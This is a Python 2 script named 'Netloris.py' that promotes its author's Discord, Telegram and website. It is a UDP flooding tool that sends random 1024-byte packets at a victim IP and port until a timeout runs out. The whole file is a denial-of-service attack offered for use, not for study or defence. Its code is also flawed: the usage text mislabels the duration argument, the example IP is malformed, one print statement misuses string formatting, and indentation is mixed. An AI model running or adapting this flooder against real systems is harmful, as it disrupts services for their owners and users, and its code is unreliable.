import time
import socket
import random
import sys



def usage():
	print '---------------------------------------------------'
	print '- USAGE: python2 Netloris.py <IP> <PORT> <PACKEt>'
	print '- EXAMPLE : python2 Netloris.py 95.15973.4 443 1000 '
        print '- MADE BY D1MOD1877'
	print '- DISCORD SERVER https://discord.gg/d1mod'
	print '- 1877 WEBSITE https://1877.team/'
        print '- 1877 TEAM CHANNEL https://t.me/x1877x'
	print '---------------------------------------------------'



def flood(victim, vport, duration):
    
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # 1024 representes one byte to the server
    bytes = random._urandom(1024)
    timeout =  time.time() + duration
    sent = 1000000

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print "ATTACKING BY D1MOD1877 ✔"%(sent, victim, vport)

def main():
    print len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()
